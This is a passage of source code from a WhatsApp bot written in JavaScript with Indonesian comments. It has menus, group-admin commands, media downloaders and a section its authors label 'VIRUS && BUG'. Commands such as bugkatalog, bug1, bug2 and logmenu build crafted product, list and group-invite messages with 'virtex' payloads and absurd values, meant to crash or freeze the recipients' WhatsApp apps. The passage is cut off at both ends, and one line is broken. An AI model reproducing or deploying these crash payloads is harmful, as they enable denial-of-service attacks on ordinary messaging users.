🧄${prefix}ᴍᴇɢᴜᴍɪɴ
🧄${prefix}ᴏᴛᴀᴋᴅᴇsᴜ
🧄${prefix}ᴅᴏᴜᴊɪɴᴅᴇsᴜ
🧄${prefix}sᴛᴏʀʏᴀɴɪᴍᴇ
🧄${prefix}ɴᴀᴋᴀɴᴏᴍɪᴋᴜ
🧄${prefix}ɴᴀᴋᴀɴᴏɴɪɴᴏ
🧄${prefix}ɴᴀᴋᴀɴᴏɪᴛsᴜᴋɪ
🧄${prefix}ᴏᴛᴀᴋᴜᴏɴɢᴏɪɴɢ
🧄${prefix}ɴʜᴇɴᴛᴀɪ
🧄${prefix}ɴɴᴇᴋᴏᴘᴏɪ
🧄${prefix}ɴᴇᴋᴏᴘᴏɪ3ᴅ
🧄${prefix}ɴᴇᴋᴏᴘᴏɪᴄᴏsᴘʟᴀʏ
🧄${prefix}ɴᴇᴋᴏᴘᴏɪsᴇᴀʀᴄʜ

 *𝑫𝑶𝑾𝑵𝑳𝑶𝑨𝑫 𝑴𝑬𝑵𝑼🌹*
 
🔋${prefix}ғᴀᴄᴇʙᴏᴏᴋ <ᴜʀʟ>
🔋${prefix}ɴᴛʜᴇɴᴛᴀɪᴘɢғ <ᴜʀʟ>
🔋${prefix}ᴛɪᴋᴛᴏᴋ <ᴜʀʟ>
🔋${prefix}twitter <ᴜʀʟ>
🔋${prefix}tiktoknowm <ᴜʀʟ>
🔋${prefix}igdl <ᴜʀʟ>
🔋${prefix}ytmp3 <ᴜʀʟ>
🔋${prefix}ytmp4 <ᴜʀʟ>
🔋${prefix}mediafire <ᴜʀʟ>
🔋${prefix}soundcloud <ᴜʀʟ>
🔋${prefix}tiktokaudio <ᴜʀʟ>
🔋${prefix}play <ǫᴜᴇʀʏ>

 *𝑮𝑹𝑼𝑷 𝑴𝑬𝑵𝑼🌹*
 
⚙️${prefix}ᴀғᴋ
⚙️${prefix}ɴᴏᴛɪғ <ᴛᴇᴋs>
⚙️${prefix}ɪɴғᴏɢʀᴜᴘ
⚙️${prefix}ᴄʜᴀᴛɪɴғᴏ
⚙️${prefix}ᴋɪᴄᴋ <ᴛᴀɢ>
⚙️${prefix}ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢ>
⚙️${prefix}ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢ>
⚙️${prefix}ʟɪɴᴋɢᴄ
⚙️${prefix}ʟᴇᴀᴠᴇ
⚙️${prefix}sᴇᴛᴅᴇsᴄ <ᴛᴇᴋs>
⚙️${prefix}sᴇᴛɢᴛᴜᴘɴᴀᴍᴇ <ᴛᴇᴋs>
⚙️${prefix}sᴇᴛᴘᴘɢʀᴜᴘ <ғᴏᴛᴏ>
⚙️${prefix}ɢʀᴜᴘsᴇᴛᴛɪɴɢ
⚙️${prefix}ᴛᴀɢᴀʟʟ
⚙️${prefix}ʜɪᴅᴇᴛᴀɢ <ᴛᴇᴋs>
⚙️${prefix}ᴍᴜᴛᴇ
⚙️${prefix}ᴜɴᴍᴜᴛᴇ
⚙️${prefix}ᴀɴᴛɪʟɪɴᴋ <ᴇɴᴀʙʟᴇ/ᴅɪsᴀʙʟᴇ>
⚙️${prefix}ᴡᴇʟᴄᴏᴍᴇ <ᴇɴᴀʙʟᴇ/ᴅɪsᴀʙʟᴇ>
⚙️${prefix}ᴀɴᴛɪʙᴀᴅᴡᴏʀᴅ
⚙️${prefix}ʟɪsᴛʙᴀᴅᴡᴏʀᴅ
⚙️${prefix}ᴀᴅᴅʙᴀᴅᴡᴏʀᴅ
⚙️${prefix}ᴅᴇʟʙᴀᴅᴡᴏʀᴅ

 *??𝑻𝑰𝑪𝑲??𝑹 𝑴𝑬𝑵𝑼🌹*
 
☕${prefix}ᴅᴀᴅᴜ
☕${prefix}ᴅᴏɢᴇ
☕${prefix}ᴛᴏɪᴍɢ
☕${prefix}ᴘᴀᴛʀɪᴄᴋ
☕${prefix}ɢᴀʀᴡɢᴜʀᴀ
☕${prefix}ᴀᴍᴏɴɢᴜs <ᴛᴇᴋs>
☕${prefix}ᴛᴛɢ <ᴛᴇᴋs>
☕${prefix}ᴀᴛᴛᴘ <ᴛᴇᴋs>
☕${prefix}sᴛɪᴄᴋᴇʀᴀɴɪᴍᴇ
☕${prefix}sᴇᴍᴏᴊɪ <ᴇᴍᴏᴊɪ>
☕${prefix}ᴇᴍᴏᴊɪ <ᴇᴍᴏᴊɪ>
☕${prefix}sᴛɪᴄᴋᴇʀ <ʀᴇᴘʟʏ ғᴏᴛᴏ / ᴠɪᴅᴇᴏ>
☕${prefix}sᴍᴇᴍᴇ
☕${prefix}sᴡᴍ
☕${prefix}ᴛᴀᴋᴇ
☕${prefix}ᴛᴏᴠɪᴅᴇᴏ

 *𝑮𝑨𝑴𝑬 𝑴𝑬𝑵𝑼🌹*
 
🎮${prefix}sʟᴏᴛ
🎮${prefix}ʟɪᴍɪᴛɢᴀᴍᴇ
🎮${prefix}ɢᴇʟᴜᴅ <ᴛᴀɢ>
🎮${prefix}ᴛɪᴄᴛᴀᴄᴛᴏᴇ <ᴛᴀɢ>
🎮${prefix}sɪᴀᴘᴀᴀᴋᴜ
🎮${prefix}ғᴀᴍɪʟʏ100
🎮${prefix}ᴋᴜɪsᴍᴀᴛʜ
🎮${prefix}ᴀsᴀʜᴏᴛᴀᴋ
🎮${prefix}ᴛᴇʙᴀᴋʟɪʀɪᴋ
🎮${prefix}ᴛᴇʙᴀᴋʟᴀɢᴜ
🎮${prefix}ᴛᴇʙᴀᴋᴋᴀᴛᴀ
🎮${prefix}sᴜsᴜɴᴋᴀᴛᴀ
🎮${prefix}ᴋɪᴍɪᴀᴋᴜɪs
🎮${prefix}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
🎮${prefix}ᴛᴇʙᴀᴋᴊᴇɴᴀᴋᴀ
🎮${prefix}ᴛᴇʙᴀᴋᴀɴɪᴍᴇ
🎮${prefix}ᴛᴇʙᴀᴋᴛᴇʙᴀᴋᴀɴ
🎮${prefix}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
🎮${prefix}ᴛᴇʙᴀᴋʙᴇɴᴅᴇʀᴀ
🎮${prefix}sᴜɪᴛ <ʙᴀᴛᴜ/ᴋᴇʀᴛᴀs/ɢᴜɴᴛɪɴɢ>

 *𝑭𝑼𝑵 𝑴𝑬𝑵𝑼🌹*
 
🙆‍♂️${prefix}ᴍɪɴɪɴɢ
🙆‍♂️${prefix}ᴛᴏɢᴇʟ
🙆‍♂️${prefix}ᴄᴇᴋᴡᴀᴛᴀᴋ
🙆‍♂️${prefix}ᴄᴇᴋᴍᴀᴛɪ
🙆‍♂️${prefix}ᴡᴀɴɢʏ
🙆‍♂️${prefix}ᴄɪᴛᴀᴄɪᴛᴀ
🙆‍♂️${prefix}ᴛᴏxɪᴄ
🙆‍♂️${prefix}ᴛʀᴜᴛʜ
🙆‍♂️${prefix}ᴅᴀʀᴇ
🙆‍♂️${prefix}ᴀᴘᴀᴋᴀʜ
🙆‍♂️${prefix}ʙɪsᴀᴋᴀʜ
🙆‍♂️${prefix}ᴋᴀᴘᴀɴᴋᴀʜ
🙆‍♂️${prefix}ʀᴀᴛᴇ
🙆‍♂️${prefix}ᴊᴀᴅɪᴀɴ
🙆‍♂️${prefix}ᴄᴀɴᴛɪᴋ
🙆‍♂️${prefix}ɢᴀɴᴛᴇɴɢ
🙆‍♂️${prefix}ʙᴇʙᴀɴ
🙆‍♂️${prefix}ʙᴀʙɪ
🙆‍♂️${prefix}ᴄᴇᴋɢᴀɴᴛᴇɴɢ
🙆‍♂️${prefix}ᴄᴇᴋᴄᴀɴᴛɪᴋ

 *𝑩𝑼𝑮 𝑴𝑬𝑵𝑼🌹*
 
🗿${prefix}ʙᴜɢ1
🗿${prefix}ʙᴜɢ2
🗿${prefix}ʙᴜɢ3 <ᴊᴜᴍʟᴀʜ>
🗿${prefix}bugpc
🗿${prefix}ʙᴜɢᴘᴄ2 <ᴊᴜᴍʟᴀʜ>
🗿${prefix}ʙᴜɢᴛʀᴏʟɪ
🗿${prefix}ʙᴜɢᴛʀᴏʟɪ2 <ᴊᴜᴍʟᴀʜ>
🗿${prefix}ʙᴜghole
🗿${prefix}ʙᴜɢᴠɴ
🗿${prefix}ʙᴜɢʟᴏᴋᴀsɪ
🗿${prefix}ʙᴜɢᴄᴏᴍʙɪɴᴇ
🗿${prefix}ʙᴜɢᴋᴀᴛᴀʟᴏɢ`,
"currencyCode": "Rp.",
"priceAmount1000": "10000",
"productImageCount": 1
},
"businessOwnerJid": "6281333603591@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ftroli, contextInfo:{}}) 

Hisnu.relayWAMessage(res)
break
            case 'logmenu':
if (!mek.key.fromMe && !isOwner) return
buf = fakeimage
imeu = await Hisnu.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Hisnu.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "150453297375",
"title": `bang`,
"description": `${virtex}`,
"currencyCode": "RM",
"priceAmount1000": "9999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "6281333603591@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ftroli, contextInfo:{}}) 

Hisnu.relayWAMessage
break
        case 'betamenu':
if (!mek.key.fromMe && !isOwner) return
buf = fakeimage
imeu = await Hisnu.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Hisnu.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "1",
"title": `BETA VERSION`,
"description": `*KUNZ CUMA NYOBA YA KAWAN*\n*TES DOANG BANG*`,
"currencyCode": "USD",
"priceAmount1000": "999999999999999999",
"productImageCount": 2
},
"businessOwnerJid": "6281333603591@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ftroli, contextInfo:{}}) 

Hisnu.relayWAMessage(res)
break

        case 'antivirtek':
        reply('SUKSES MENGAKTIFKAN ANTI VIRTEK')
        break
        case 'tes':
               reply('Okeh nyala')
               break
               
// UDAH GAK USAH DIBUKA                             
         //case 'info':  // Jangan Di Ubah Plise
               //if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               //urlinfo = 'https://telegra.ph/file/d5ec4be13a8b13dcf4aab.jpg'
               //thankslort = `*┌──「 ɪɴғᴏʀᴍᴀᴛɪᴏɴ 」*
/*│*
*├ ʙᴏᴛ ᴛʏᴘᴇ : ɴᴏᴅᴇᴊs*
*├ ɴᴀᴍᴇ : ᴍᴀʀᴄᴇʟ*
*├ ᴠᴇʀsɪᴏɴ : 1.0*
*│*
*├─「 𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊 」*
*│*
*├ ᴀʟʟᴀʜ sᴡᴛ*
*├ ɴɪɴᴏ ᴄʜᴀɴ*
*├ xɪɴᴢ ʙᴏᴛ*
*├ ᴀʀɪғ*
*├ ᴀɴᴅ ᴀʟʟ ᴄʀᴇᴀᴛᴏʀ ʙᴏᴛ*
*│*
*└──「 WAKK BOTZ 」*`
             Hisnu.sendMessage(from, await getBuffer(urlinfo), image, {quoted: ftroli, caption: thankslort })
             break*/
             
 //Donasi nya mek  
case 'donate':          
case 'donasi':
wew = fs.readFileSync(`./media/sewa.jpg`)
teks = `
اتَّقوا النَّارَ ولو بشقِّ تمرةٍ ، فمن لم يجِدْ فبكلمةٍ طيِّبةٍ
“jauhilah api neraka, walau hanya dengan bersedekah sebiji kurma (sedikit). Jika kamu tidak punya, maka bisa dengan kalimah thayyibah” [HR. Bukhari 6539, Muslim 1016


𝑌𝑜𝑘 𝐿𝑎ℎ 𝐾𝑎𝑘 𝐷𝑜𝑛𝑎𝑠𝑖 𝑀𝑎𝑢 𝐵𝑢𝑎𝑡 𝐵𝑒𝑙𝑖 𝑃𝑎𝑘𝑒𝑡𝑎𝑛 😩

╭─❒ 
│➪  𝑷𝒖𝒍𝒔𝒂 : 𝟎𝟖𝟏𝟑-𝟑𝟑𝟔𝟎-𝟑𝟓𝟗𝟏
│➪  𝑮𝒐𝒑𝒂𝒚 : 𝑺𝒄𝒂𝒏 𝑳𝒂𝒉 𝑲𝒂𝒌 🙂 ...
│➪  𝑫𝒂𝒏𝒂 : 𝑮𝒌 𝑷𝒖𝒏𝒚𝒂 𝑲𝒂𝒌 ...
│➪  𝑶𝒗𝒐 : 𝑮𝒌 𝑷𝒖𝒏𝒚𝒂 𝑲𝒂𝒌 ...
╰─❒

𒍮  𝑀𝑎𝑘𝑎𝑠𝑖ℎ 𝑌𝑎 𝑌𝑔 𝑆𝑢𝑑𝑎ℎ 𝐷𝑜𝑛𝑎𝑠𝑖 😇 `
Hisnu.sendMessage(from, wew, image, { quoted: ftroli, caption: teks })
break
//Ngentod                                     
case 'media':
if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
if (isBan) return reply(mess.ban)
if (!q) return reply('Urlnya?')
reply(mess.wait)
sendMediaURL(from, `${args[0]}`, "").catch(() => reply('Error'))
break
      case 'get':
      case 'fetch': //ambil dari nuru
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')
             res = await fetch(q)
             if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
             delete res
             throw `Content-Length: ${res.headers.get('content-length')}`
}
             if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
             txtx = await res.buffer()
             try {
             txtx = util.format(JSON.parse(txtx+''))
             } catch (e) {
             txtx = txtx + ''
             } finally {
             reply(txtx.slice(0, 65536) + '')
}
             break
      case 'searchmsg': 
case 'caripesan':  //by ANU TEAM
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${prefix + command} halo|10`)
             teks = arg
             if (teks.includes("|")) { 
             try {
             var ve = teks.split("|")[0]
             var za = teks.split("|")[1]
             sampai = `${za}`
             if (isNaN(sampai)) return reply('Harus berupa Angka!')
             batas = parseInt(sampai) + 1
             if (batas > 30) return reply('Maks 30!')
             reply(mess.wait)
             cok = await Hisnu.searchMessages(`${ve}`, from, batas,1) 
             if (cok.messages.length < 2) return reply('Tidak Ditemukan Pesan') 
             if (cok.messages.length < parseInt(batas)) reply(`Hanya Ditemukan ${cok.messages.length - 1} Pesan`)
             for (i=1;i < cok.messages.length;i++) {
             if (cok.messages[i].message) {
             Hisnu.sendMessage(from, `Ditemukan!`, text, {sendEphemeral: true, quoted: cok.messages[i]}) 
}
}
             } catch (e) {
             return reply(String(e))
}
             } else {
             reply(`Format salah tod, ini contoh format yang benar : ${prefix + command} halo|10`)
}
             break
       case 'lolkey':
       case 'cekapikey':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (args.length < 1) return reply(`Ketik ${prefix}lolkey [Apikeynya]`) 
              anu = await fetchJson(`https://lolhuman.herokuapp.com/api/checkapikey?apikey=${q}`)
              teks = `*YOUR APIKEY*\n\n➸ Ussername= ${anu.result.username}\n➸ Request= ${anu.result.requests}\n➸ Today= ${anu.result.today}\n➸ Akun Type= ${anu.result.account_type}\n➸ Expired= ${anu.result.expired}\n➸ API = https://lolhuman.herokuapp.com`
              Hisnu.sendMessage(from, teks, text, {quoted: mek})
              break
       case 'bugreport':
       case 'reportbug':
              if (args.length < 1) return reply(`Ketik ${prefix}bugreport [fiturnya] [Error Nya Gimana]`) 
              teks = args.join(' ')
              reply('Terima Kasih Telah Melaporkan Bug Pada Owner, Jika Itu Sekedar Iseng Maka Akan Di Ban Oleh Bot!')
              Hisnu.sendMessage('6281333603591@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              break
       case 'readall':
              totalchat.map( async ({ jid }) => {
              await Hisnu.chatRead(jid)
})
              reply(`\`\`\`Berhasil membaca ${unread.length} Chat !\`\`\``)
              console.log(totalchat.length)
              break	

//------------------< Enable/Disable >-------------------
       case 'leveling':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (ar[0] === 'enable') {
              if (isLevelingOn) return reply('Fitur leveling telah diaktifkan sebelumnya.')
            _leveling.push(from)
              fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
              reply('Fitur leveling berhasil diaktifkan.')
              } else if (ar[0] === 'disable') {
              var anup = _leveling.indexOf(from)
            _leveling.splice(anup, 1)
              fs.writeFileSync('./database/group/leveling.json', JSON.stringify(_leveling))
              reply('Fitur leveling berhasil dimatikan.')
              } else {
              reply('Pilih enable atau disable!')
}
              break
       case 'antilinky':
              if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
              if (!q) return reply(`Pilih enable atau disable`)
              if (args[0].toLowerCase() === 'enable'){
              if (isAntiLink) return reply(`Udah aktif`)
              antilink.push(from)
              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
              reply('*「 ANTILINK DI AKTIFKAN 」*\n\nYang Ngirim Link Group Bakal Ke Kick!')
              } else if (args[0].toLowerCase() === 'disable'){
              let anu = antilink.indexOf(from)
              antilink.splice(anu, 1)
              fs.writeFileSync('./database/group/antilink.json', JSON.stringify(antilink))
              reply('*「 ANTILINK DI NONAKTIFKAN 」*')
              } else {
              reply(`Pilih enable atau disable`)
}
              break
       case 'welcomey':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (!isGroup) return reply(mess.only.group)
               if (args.length < 1) return reply('!welcome enable/disable')
               if ((args[0]) === 'enable') {
               if (isWelkom) return reply('Udah aktif')
               welkom.push(from)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
               } else if ((args[0]) === 'disable') {
               welkom.splice(from, 1)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
               } else {
               reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
               break
        case 'mute':
               if (!isGroup) return reply(mess.only.group)
               if (!isGroupAdmins) return reply(mess.only.admin)
               if (args.length < 1) return reply('!mute enable/disable')
               if (args[0].toLowerCase() === 'enable'){
               if (isMuted) return reply(`udah di mute`)
               mute.push(from)
               fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
               reply(`*...:* *MODE ON* *:...*\n\nPerhatian untuk member grup\nBot telah di mute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
               } else if (args[0].toLowerCase() === 'disable'){
               anu = mute.indexOf(from)
               mute.splice(anu, 1)
               fs.writeFileSync('./database/group/mute.json', JSON.stringify(mute))
               reply(`*...:* *MODE OFF* *:...*\n\nPerhatian untuk member grup\nBot telah di unmute di grup ${groupName} , Silahkan menggunakan bot dengan sewajarnya\n\n_*${botName}*_`)
               } else {
               reply(`Pilih enable atau disable`)
}
               break
        case 'grupsetting':
        case 'groupsetting':
               if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
               if (!isGroup) return reply(mess.only.group)
               if (!isGroupAdmins) return reply(mess.only.admin)
               list = []
               com = [`group enable`,`leveling enable`,`welcome enable`,`antilink enable`,`mute enable`]
               comm = [`group disable`,`leveling disable`,`welcome disable`,`antilink disable`,`mute disable`]
               listnya = [`Group open/close`,`Leveling enable/disable`,`Welcome enable/disable`,`Antilink enable/disable`,`Mute enable/disable`]
               suruh = [`Enable`, `Disable`]
               fiturname = [`Group`,`Leveling`,`Welcome`,`Antilink`,`Mute`]
               startnum = 0; let startnu = 0; let startn = 0;let start = 0
               startnumm = 1
               for (let x of com) {
               var yy = {title: `${listnya[startnum++]}`,
                    rows: [
                       {
                        title: `${suruh[0]}`,
                        description: `\nMengaktifkan ${fiturname[startnu++]}`,
                        rowId: `${prefix}${x}`
                      },{
                        title: `${suruh[1]}`,
                        description: `\nMenonaktifkan ${fiturname[startn++]}`,
                        rowId: `${prefix}${comm[start++]}`
                      }
                    ]
                   }
                        list.push(yy)
           }
             listmsg(from, `Group Setting`, `Atur Settingan Grup anda disini......`, list)
             break
//case 'group':
//case 'grup':
        
        //txtt =`Hai Kak ${pushname}\nPilih Di bawah`

               //buttons = [{buttonId: '!group enable',buttonText:{displayText: 'open'},type:1},{buttonId:'!group disable',buttonText:{displayText:'close'},type:1}]
 
               //buttonsMessage = {
               //contentText: `${txtt}`,
               //footerText: 'Pilih open : Untuk Membuka\nPilih close : Untuk Menutup',
               //buttons: buttons,
               //headerType: 1
//}

          //prep = await Hisnu.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
               //Hisnu.relayWAMessage(prep)
               //break
      case 'group':
      case 'grup':
             if (isBanned) return reply('Maaf tapi kamu sudah terbanned silahkan ketik .owner untuk menggunakan fitur bot lagi')
             if (!isGroup) return reply(mess.only.group)
             if (!isGroupAdmins) return reply(mess.only.admin)
             if (!isBotGroupAdmins) return reply(mess.only.Badmin)
             if (args.length < 1) return reply('!group enable/disable')
             if (args[0].toLowerCase() === 'enable'){
             Hisnu.groupSettingChange(from, "announcement", false)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)))
             } else if (args[0].toLowerCase() === 'disable'){
             Hisnu.groupSettingChange(from, "announcement", true)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)))
             } else if (args[0].toLowerCase() === 'close'){
             Hisnu.groupSettingChange(from, "announcement", true)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)))
             } else if (args[0].toLowerCase() === 'open'){
             Hisnu.groupSettingChange(from, "announcement", false)
            .then((res) => reply(jsonformat(res)))
            .catch((err) => reply(jsonformat(err)))
             } else {
             reply(`Pilih enable atau disable`)
}
             break
//𝙑𝙄𝙍𝙐𝙎 && 𝘽𝙐𝙂 𝙉𝙂𝘼𝘽:)
//𝘽𝙪𝙜 𝙃𝙤𝙡𝙚
case 'bughole':
Hisnu.sendMessage(from, fakeimage, image, {thumbnail:fs.readFileSync('./media/Menu.jpg'), caption :bughole(), quoted: ftroli})
Hisnu.sendMessage(from, bughole(prefix), MessageType.text, {quoted: mek})
break
                                                                          
case 'bugimg': //vgam sama vgam2 ganti pake gambar lu bugimg + bugtroli + bughole + buggc [buatan fajargozn]
if (!mek.key.fromMe && !isOwner) return
Hisnu.sendMessage(from, fakeimage, image, {thumbnail:fs.readFileSync('./media/Menu.jpg'), caption :bughole(), quoted: ftroli})
Hisnu.toggleDisappearingMessages(from, 'Awoakwoakwoak')
break

//𝘽𝙐𝙂𝙂𝘾 𝘽𝙔 ( 𝙁𝘼𝙅𝘼𝙍 )
case 'buggc': 
if (!mek.key.fromMe && !isOwner) return
reply('Bwhahahwahaha')
await Hisnu.toggleDisappearingMessages(from)
Hisnu.sendMessage(from, `Aqokqowkej`)

//𝘽𝙐𝙂𝙆𝘼𝙏𝘼𝙇𝙊𝙂 𝘽𝙔 ( 𝙈𝙔𝙈𝘼𝙉𝙎 𝘼𝙋𝙄𝙎 )
case 'bugkatalog':
if (!mek.key.fromMe && !isOwner) return
buf = fakeimage
imeu = await Hisnu.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Hisnu.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": "150453297177375",
"title": `BY = 𝟢𝟪𝟫𝟨𝟥𝟫𝟨𝟢𝟢𝟤𝟣𝟨 ~ 404 ${vipi}`,
"description": `${virtex}`,
"currencyCode": "IDR",
"priceAmount1000": "9999999999999999999999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "6281333603591@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ftroli, contextInfo:{}}) 

Hisnu.relayWAMessage(res)
break

// Virus List Message ( MyMans APIs )
case 'bug1':
res = await Hisnu.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
"description": `\`\`\`Use The Bot As Best You Can And Dont Misuse The Bot Feature\`\`\``,
"buttonText": vipi,
"listType": "SINGLE_SELECT",
"sections": [
{
"title": vipi,
"rows": [
{
"title": "Banned",
"rowId": "Banned"
}
]
}
]
}
}, {quoted:ftroli})
Hisnu.relayWAMessage(res)
break

// Bug Invite Group ( MyMans APIs )
case 'bug2':
if (!isOwner && !mek.key.fromMe) return
buf = fakeimage
imeu = await Hisnu.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
res = await Hisnu.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": "162533333338378",
"groupName": `KunzxD ~ 404 ${vipi}`,
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADIAMgDASIAAhEBAxEB/8QAHAAAAQUBAQEAAAAAAAAAAAAABAADBQYHAgEI/8QAQBAAAgEDAgQDBAgEBAUFAAAAAQIDAAQRBSEGEjFBE1FhByJxgRQyUpGhscHRFSNC4SRDYvAWM2NyojRzgrLi/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAJxEAAgICAgIBBAIDAAAAAAAAAAECEQMxEiEEQRMiMlFhkaEFcYH/2gAMAwEAAhEDEQA/AJmRqFkOdh1rtztTEjd+9MRGXxO9Q0pwSal7vLZABJOwA3p6w4T1a/IIt/AjP9U3u/h1oGOcNXkY0q8sQj+NOT74GQFIx/v41axrVhDbxRyXG+MEsuO1O6FwbbacPEklkmuD1Ye6o+Ary64KsZySGmDHuXzQBO6RKj2MRUho5F5wexBNEtZK8jOsvIW35StB6fBd2NtBbrAkkcKhFxJjIHTqKOFzKN2snz/pZSabVjTGzYSA7SIa8axnHTlPzp1rwEe/bXK/Bc0hqFugwwnX/uib9qVIdsYNrOP8vPwNcNFKv1o2+6iDqNkzZ+liPHYnGfvoDXeJbDSLB7qW5V1H1VRgSx8qKQWxrULyHT7WSe5JjiQZYms81X2msj8um2KMv2536/IfvVP4p4mvuI7xpbuZlt8+5AG91R+pqDDJnlHMR91RQy4z+0TW5GHI1tEPJE/eh/8AjLiB3DG7OP8A2xiq8sSBc7ketd5A+ocfCgC5abx7ewsPp0aMD/Um34VeNG4htdUUGNwJiN0J3rEzIc7tn5Ubp1vf/SEk09iGByMGk+gXZu5ZSobJwd81Fa7fx2VhNO2SFHQd/Sq3YcXIgW3vAIplAByM70Dx/qgl0NBC4bncczA7DairDRRtU1GW9uZJZX5mY+8fL0FAMzSrzHZew8zTOeeTkHfrRC9cge6o2Hma0RLBnHgnI3bqSa9Zg6hvP8DTsqc5OaGaN4ySoyMbigR2p5zg9fhSpRlSRzDHkR2pUAbja6feXn/p7d3H2sYH31MWPCMjnmv5gi/Yj3J+dSeizE6Va8pP1Ox9aPEzg9Wx8aYDen6LZWJDW8Kh/ttu330f4R8wRQouZB32+FOLdsBvj7qACPC9KXhfGmRdnuAa6W7X+paAH1Q46mveU+eflTK3MQ7EV2LmL7X4UAdlT6V4QfgO9ITRnfnWm5powvVT6ZoAi9f1a30mykmuSPcGeUnrXz5xTrc2uak9xJ7sIOEUDAx51O+0nX3vtVkgjcmFTjlB+sao7BnPvH4AVDdlIRYV3CeY9T8hXBXk6iukYnz+QoAKB7An503IT0DN8qUSNIcDp38qe8JYyMjLedACs7cvKC+Wx1zUxbar4RZYlCAbAiouWTkh8NRjO5PemOmw60uN7HdBV1OZZPFY7t1qOurqTkMLNzRE5A8jT4PulT8ai7r3Xxn3e1UlRJ2jcmWHU7UQhPKB5fnQUR5mHkKKVsKp9c0xDwIU79t6ctLZ7p8BSR2puOJpZuRerd607hLQI4bdXkQcx6ZqJzo0hCzOb3SZ7dS3IcDcjFKtf1TTI5oWygzjcUqj5WtlvF+AWHV7y2iWOCbCL0XAOKdHE+ooPrxsB5rUJNMkf1iPhUdc3buuF90YrVswNBfXL6GLneGKRfJVOTRB12VE5ns89Nlk9fhTcHgx6XbXE3NytEhJAz1A7Cibm3UQnAyNvzp9jHE1uJvrW0y/ca6XWLXqRKvxWmvogKjpXJtNsBRTphaDF1a0b/OI+KmnBqFq3S4j+ZxUabId0rg2IH9B+6jsOibWeJx7ksbD0Iqk8ccVwadA0MDCS6cEbdFrriRY7HTXmchFGxJ2rHdQu/pN08h2ycKPIfCpbY0jyWRpJGkcks3UmuUB/pBLdgBRFrZSzMvOCinz61N2dtEHEVvGJGHYdPmazlOjSMGyHj01zF40+AD0XuakLDQ5px4jIVQ+lW3TND5mWa7xJL2GPdUegovW5Bb2awwLhmPIoHc96z+Rs0+NIo9xEiOYoF9xDgnzNRvMWmIHn3qzXlmLS0bb3gNz